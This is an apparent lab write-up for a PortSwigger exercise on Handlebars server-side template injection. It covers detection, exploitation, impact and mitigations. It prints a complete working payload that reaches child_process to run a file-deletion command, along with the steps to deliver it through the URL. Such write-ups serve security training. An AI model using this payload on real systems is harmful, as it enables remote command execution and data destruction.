
# 4. Server-Side Template Injection via message Parameter (Handlebars)

## 2. CVSS Score

**CVSS v3.1 Base Score: 8.6 (High)**
**CWE-94: Improper Control of Generation of Code ('Code Injection')**

---

## 3. OWASP Top 10 Reference

* **A03:2021 – Injection**

---

## 4. Description of Vulnerability

The application uses Handlebars as its server-side template engine. The `message` parameter is reflected in a Handlebars template without proper sanitization, allowing injection of arbitrary Handlebars expressions. This vulnerability can be exploited to execute arbitrary OS commands by abusing Handlebars features and JavaScript internals, specifically by accessing the `child_process` module to execute commands like file deletion.

---

## 5. Detailed Explanation of What We Performed

* Tested the `message` parameter with various fuzz strings containing template syntax from different engines.
* Identified Handlebars by observing the error messages returned from invalid template syntax.
* Researched “Handlebars server-side template injection” and found a known exploit by @Zombiehelp54.
* Modified the exploit to execute the OS command to delete Carlos’s morale file:

```handlebars
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

* URL-encoded the payload and inserted it as the value of the `message` parameter in the URL.
* Loaded the URL to execute the payload and solve the lab.

---

## 6. Step-by-Step Procedure

### Step 1: Identify Template Engine and Injection Point

1. Navigate to the product details page and observe the use of the `message` parameter in the response.
2. Inject fuzz strings containing various template syntax characters into the `message` parameter.
3. Confirm Handlebars is used by analyzing the error messages on invalid templates.

---

### Step 2: Research and Construct Payload

4. Search online for “Handlebars server-side template injection”.
5. Locate the exploit by @Zombiehelp54 that allows arbitrary code execution via Handlebars internals.
6. Adapt the exploit to delete Carlos’s morale file using the payload shown above.

---

### Step 3: Inject Payload and Execute

7. URL-encode the entire payload.
8. Append it to the URL as the `message` parameter value:

```
https://YOUR-LAB-ID.web-security-academy.net/?message=[URL-ENCODED_PAYLOAD]
```

9. Load the URL in the browser.

---

### Step 4: Verify and Solve Lab

10. The payload executes, deleting `/home/carlos/morale.txt`.
11. Lab is marked as solved.

---

## 7. Impact of the Vulnerability

* Enables arbitrary command execution on the server via server-side template injection.
* Can result in file deletion, data leakage, and full server compromise.
* Critical threat to confidentiality, integrity, and availability.

---

## 8. Recommendations and Mitigations

* Avoid rendering user input directly in templates.
* Sanitize and escape all user inputs used in templates.
* Disable or restrict access to sensitive APIs and JavaScript internals in the template engine.
* Use strict Content Security Policy (CSP) and runtime sandboxing where possible.
* Regularly patch template engines and dependencies to fix known vulnerabilities.

---

## 9. References

* [Handlebars SSTI Exploit by @Zombiehelp54](https://github.com/zombie-help54/Handlebars-SSTI)
* [Handlebars Official Documentation](https://handlebarsjs.com/)
* [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [PortSwigger Labs – SSTI](https://portswigger.net/web-security/template-injection)

